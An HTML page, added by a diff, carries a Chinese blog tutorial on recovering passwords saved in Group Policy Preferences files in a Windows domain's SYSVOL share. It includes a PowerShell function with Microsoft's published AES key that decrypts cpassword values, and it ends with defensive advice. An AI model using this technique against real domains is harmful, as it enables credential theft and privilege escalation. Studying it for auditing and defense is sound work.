@@ -1,0 +1,855 @@
+
+
+<script type="text/javascript" src="http://7u2ss1.com1.z0.glb.clouddn.com/love.js"></script>
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+	<script src="http://echarts.baidu.com/dist/echarts.common.min.js"></script>
+	<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+    </style>
+
+
+    
+
+    <title>域渗透——利用SYSVOL还原组策略中保存的密码 | </title>
+    <meta name="author" content="wiki">
+    
+    <meta name="description" content="0x00 前言
+在之前的文章《域渗透——Local Administrator Password Solution》对LAPS的利用进行了分析。使用LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。
+那么，如果域内未配置LAPS，如何批量设置域内主机的本地管理员密码呢？这其中又存在">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="域渗透——利用SYSVOL还原组策略中保存的密码"/>
+    <meta property="og:site_name" content="wiki"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="wiki" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/lastest.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+</head>
+
+<style>
+
+</style>
+<body style="background-color:#2196f3">
+
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+    <script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.15.0/TweenMax.min.js"></script>
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo darken-1">
+    
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">wiki</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            首页
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            归档
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            分类
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            搜索
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-2" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://p4gdp8beq.bkt.clouddn.com/timgsi1.jpg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">wiki</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    首页
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    归档
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    分类
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    搜索
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-2" id="category-menu">
+    
+
+            
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">搜索</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
+<div class="container main-container">
+    <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo darken-2">
+        <span class="breadcrumb">当前位置（分类目录）</span>
+        
+            
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+	<!-- 添加渲染 -->
+	<div id="toc" class="toc-article">
+		<strong class="toc-title"></strong>
+	</div> 
+        <div class="card-content">
+		  
+			
+            
+
+            <div class="article-title">
+                
+    
+        <h1>域渗透——利用SYSVOL还原组策略中保存的密码</h1>
+    
+
+
+            </div>
+            <time class="red-link-context" datetime="2018-05-25T13:03:44.877Z"><a href="">2018-05-25</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+
+            <div class="toc red-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x00-前言"><span class="section table-of-contents-text">0x00 前言</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x01-简介"><span class="section table-of-contents-text">0x01 简介</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x02-域内共享文件夹-SYSVOL介绍"><span class="section table-of-contents-text">0x02 域内共享文件夹\SYSVOL介绍</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x03-域管理员批量修改域内主机本地管理员密码的方法"><span class="section table-of-contents-text">0x03 域管理员批量修改域内主机本地管理员密码的方法</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#1、测试Server-2003系统"><span class="section table-of-contents-text">1、测试Server 2003系统</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#2、测试Server-2008系统"><span class="section table-of-contents-text">2、测试Server 2008系统</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x04-组策略中可被利用的地方"><span class="section table-of-contents-text">0x04 组策略中可被利用的地方</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x05-防御"><span class="section table-of-contents-text">0x05 防御</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#0x06-小结"><span class="section table-of-contents-text">0x06 小结</span></a></li></ol>
+</div>
+
+
+            <div class="entry red-link-context">
+                <script src="\assets\js\APlayer.min.js"> </script><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><hr>
+<p>在之前的文章《域渗透——Local Administrator Password Solution》对LAPS的利用进行了分析。使用LAPS最大的优点是能够确保每台域内主机有不同的密码，并且定期更换。</p>
+<p>那么，如果域内未配置LAPS，如何批量设置域内主机的本地管理员密码呢？这其中又存在哪些可被利用的地方呢？</p>
+<p>本文将要介绍如何利用SYSVOL还原组策略中保存的密码，分析技术细节，最后给出防御建议</p>
+<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><hr>
+<p>本文将要介绍以下内容：</p>
+<ul>
+<li>域内共享文件夹\SYSVOL介绍</li>
+<li>域管理员批量修改域内主机本地管理员密码的方法</li>
+<li>组策略中可被利用的地方</li>
+<li>实际测试</li>
+<li>防御建议</li>
+</ul>
+<h2 id="0x02-域内共享文件夹-SYSVOL介绍"><a href="#0x02-域内共享文件夹-SYSVOL介绍" class="headerlink" title="0x02 域内共享文件夹\SYSVOL介绍"></a>0x02 域内共享文件夹\SYSVOL介绍</h2><hr>
+<p>在域中，存在一个默认的共享路径：</p>
+<p> <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p>
+<p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
+<p>例如，测试主机所在域为test.local，可访问共享文件夹<code>\\test.local\SYSVOL\test.local</code>，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-1.png" alt="Alt text"></p>
+<h2 id="0x03-域管理员批量修改域内主机本地管理员密码的方法"><a href="#0x03-域管理员批量修改域内主机本地管理员密码的方法" class="headerlink" title="0x03 域管理员批量修改域内主机本地管理员密码的方法"></a>0x03 域管理员批量修改域内主机本地管理员密码的方法</h2><hr>
+<h3 id="1、测试Server-2003系统"><a href="#1、测试Server-2003系统" class="headerlink" title="1、测试Server 2003系统"></a>1、测试Server 2003系统</h3><p>对于server2003，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行vbs脚本的方式</p>
+<p>给出一个修改密码的vbs脚本(实现方式不唯一)，代码如下：</p>
+<pre><code>strComputer = &quot;.&quot;
+Set objUser = GetObject(&quot;WinNT://&quot; &amp; strComputer &amp; &quot;/Administrator, user&quot;)
+objUser.SetPassword &quot;domain123!&quot;
+objUser.SetInfo
+</code></pre><p>这种实现方式，最大的弊端在于修改后的密码会明文保存在vbs脚本中</p>
+<p>而该vbs脚本通常会保存在共享文件夹\SYSVOL</p>
+<p>这就存在一个隐患:</p>
+<p><strong>任何域用户都能读取该vbs脚本，也就能够获取脚本中保存的明文密码</strong></p>
+<h3 id="2、测试Server-2008系统"><a href="#2、测试Server-2008系统" class="headerlink" title="2、测试Server 2008系统"></a>2、测试Server 2008系统</h3><p>对于server 2008，添加了新功能，可使用Group Policy Preferences配置组策略批量修改用户本地管理员密码，具体方法如下：</p>
+<p>开始-管理工具-组策略管理</p>
+<p>选择域test.local，右键，选中在这个域中创建GPO并在此处链接，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-2.png" alt="Alt text"></p>
+<p>设置名称为test6</p>
+<p>test6-设置-右键-编辑-用户配置-首选项-控制面板设置-本地用户和组,如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-3.png" alt="Alt text"></p>
+<p>更新，administrator(内置),设置密码，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-4.png" alt="Alt text"></p>
+<p>委派，设置权限</p>
+<p>在详细一栏，可看到该策略对应的ID为<code>{E6424F10-C44B-4C45-8527-740189CBF60E}</code></p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-5.png" alt="Alt text"></p>
+<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略</p>
+<p>在共享文件夹\SYSVOL中可看到组策略对应ID的文件夹，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-6.png" alt="Alt text"></p>
+<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p>
+<p><code>\\test.local\SYSVOL\test.local\Policies\{E6424F10-C44B-4C45-8527-740189CBF60E}\User\Preferences\Groups</code></p>
+<p>Groups.xml内容如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
+- &lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;
+- &lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2017-09-25 22:57:53&quot; uid=&quot;{463245FF-08D3-4A28-95E7-42AB416DC508}&quot;&gt;
+  &lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot; /&gt; 
+  &lt;/User&gt;
+  &lt;/Groups&gt;
+</code></pre><p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/2-7.png" alt="Alt text"></p>
+<p>值得注意的是其中的cpassword项，保存的是加密后的内容<code>&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;</code></p>
+<p>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p>
+<p><a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p>
+<p>借助该私钥，我们就能还原出明文</p>
+<p>还原方式可采用Chris Campbell @obscuresec开源的powershell脚本，地址如下：</p>
+<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
+<p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件，还原出所有明文密码</p>
+<p>测试如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-1.png" alt="Alt text"></p>
+<p>当然，仅仅为了解密<code>cpassword=&quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;</code>，我们可以对以上powershell脚本的功能简化</p>
+<p>简化代码如下：</p>
+<pre><code>function Get-DecryptedCpassword {
+    [CmdletBinding()]
+    Param (
+        [string] $Cpassword 
+    )
+
+    try {
+        #Append appropriate padding based on string length  
+        $Mod = ($Cpassword.length % 4)
+
+        switch ($Mod) {
+        &#39;1&#39; {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
+        &#39;2&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
+        &#39;3&#39; {$Cpassword += (&#39;=&#39; * (4 - $Mod))}
+        }
+
+        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+
+        #Create a new AES .NET Crypto Object
+        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
+                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+
+        #Set IV to all nulls to prevent dynamic generation of IV value
+        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
+        $AesObject.IV = $AesIV
+        $AesObject.Key = $AesKey
+        $DecryptorObject = $AesObject.CreateDecryptor() 
+        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
+
+        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
+    } 
+
+    catch {Write-Error $Error[0]}
+}  
+Get-DecryptedCpassword &quot;9XLcz+Caj/kyldECku6lQ1QJX3fe9gnshWkkWlgAN1U&quot;
+</code></pre><p>还原出明文密码为domain123!，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/3-2.png" alt="Alt text"></p>
+<h2 id="0x04-组策略中可被利用的地方"><a href="#0x04-组策略中可被利用的地方" class="headerlink" title="0x04 组策略中可被利用的地方"></a>0x04 组策略中可被利用的地方</h2><hr>
+<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
+<p>Services\Services.xml </p>
+<ul>
+<li><a href="http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</a></li>
+</ul>
+<p>ScheduledTasks\ScheduledTasks.xml </p>
+<ul>
+<li><a href="http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</a></li>
+<li><a href="http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</a></li>
+<li><a href="http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</a></li>
+</ul>
+<p>Printers\Printers.xml</p>
+<ul>
+<li><a href="http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</a></li>
+</ul>
+<p>Drives\Drives.xml</p>
+<ul>
+<li><a href="http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</a></li>
+</ul>
+<p>DataSources\DataSources.xml</p>
+<ul>
+<li><a href="http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</a></li>
+</ul>
+<p><strong>注：</strong></p>
+<p>位置引用自<a href="https://webcache.googleusercontent.com/search?q=cache:MUNO5X9hSwUJ:rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=us" target="_blank" rel="noopener">https://webcache.googleusercontent.com/search?q=cache:MUNO5X9hSwUJ:rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html+&amp;cd=6&amp;hl=en&amp;ct=clnk&amp;gl=us</a></p>
+<p>但是以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的Groups.xml才会包含cpassword属性，才能用于还原明文</p>
+<p>可以拿计划任务来举例，对应ScheduledTasks.xml</p>
+<p>组策略配置的位置为：用户配置-首选项-控制面板设置-计划任务</p>
+<p>如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-1.png" alt="Alt text"></p>
+<p>新建任务，需要选中运行身份，填入用户名和密码，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-2.png" alt="Alt text"></p>
+<p>否则，不包含cpassword属性，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-3.png" alt="Alt text"></p>
+<p>现在填入一个测试密码(密码为testsuccess!，假的)，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-4.png" alt="Alt text"></p>
+<p>对应ScheduledTasks.xml也会包含cpassword属性，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/4-5.png" alt="Alt text"></p>
+<p>使用powershell对其解密，还原出密码为testsuccess!</p>
+<p>至此得出结论：</p>
+<p><strong>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密</strong></p>
+<p>这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码,组策略配置文件中的密码很容易被获得，导致权限提升</p>
+<p>为此，微软发布了补丁KB2962486，下载地址：</p>
+<p><a href="https://technet.microsoft.com/library/security/ms14-025" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms14-025</a></p>
+<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-1.png" alt="Alt text"></p>
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-25/5-2.png" alt="Alt text"></p>
+<p>当然，共享文件夹\SYSVOL下的xml文件也就不再包含cpassword属性</p>
+<p><strong>注：</strong></p>
+<p>xml文件还是会和组策略保持同步</p>
+<h2 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h2><hr>
+<p>结合攻击方法，可供选择的防御方法如下：</p>
+<p>1、使用LAPS批量管理域内主机本地管理员帐户</p>
+<p>2、域控安装补丁KB2962486</p>
+<p>3、不在组策略中使用域控密码</p>
+<p>4、设置共享文件夹\SYSVOL的访问权限</p>
+<p>5、使用PsPasswd批量修改域内主机本地管理员密码</p>
+<h2 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h2><hr>
+<p>本文介绍了如何利用SYSVOL还原组策略中保存的密码，给出了防御建议。如果域用户的本地管理员密码被攻击者获得，默认可被用于在域中远程登录。</p>
+<hr>
+<p><a href="https://github.com/3gstudent/feedback/issues/new" target="_blank" rel="noopener">LEAVE A REPLY</a></p>
+
+                
+<p class="red-link-context">
+    <a href="b53be133.html" rel="next" title="渗透技巧——Token窃取与利用">
+    上一篇：渗透技巧——Token窃取与利用
+  </a>
+</p>
+
+
+
+<p class="red-link-context">
+    <a href="2650470b.html" rel="next" title="Use CLR to bypass UAC">
+    下一篇：Use CLR to bypass UAC
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+	
+</article>
+
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style_32x32">
+	<a class="jiathis_button_qzone"></a>
+	<a class="jiathis_button_tsina"></a>
+	<a class="jiathis_button_tqq"></a>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_renren"></a>
+	<a href="http://www.jiathis.com/share?uid=2157721" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	<a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code_mini/jia.js?uid=2157721" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+<!-- ������City�氲װ���� -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC8zNDIxOS8xMDc1Nw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> Ϊ����ʹ�����������۹����뼤��JavaScript</noscript>
+</div>
+<!-- City�氲װ��������� -->
+
+ 
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large red">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect brown" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse indigo"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>	
+  </div>
+	
+    </main>
+    
+  
+
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/jquery.min.js"></script>
+<script type="text/javascript" src="http://imagestp.cfyqy.com/cfyqy/pet/js/spig.js"></script>
+<link rel="stylesheet" href="http://imagestp.cfyqy.com/cfyqy/pet/css/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+<div >
+<!--小人只在首页显示 start*-->
+<div id="spig" class="spig">
+    <div id="message">正在加载中……</div>
+    <div id="mumu" class="mumu"></div>
+</div>
+</div>
+<!--小人end*-->
+ 
+<footer class="page-footer indigo darken-1 darken-1">
+	
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+           
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://www.itxueke.com/SecNavi/#3782" target="_blank">IT学客安全导航</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+    <div class="footer-copyright red-link-context">
+        <div class="container">
+            © just do !
+        </div>
+    </div>
+	
+</footer>
+
+	
+
+<script>(function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/APP_ID.js","daovoice");</script>
+<script>
+  daovoice('init', {
+    app_id: "45fb937d",
+  });
+  daovoice('update');
+</script>
+  <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
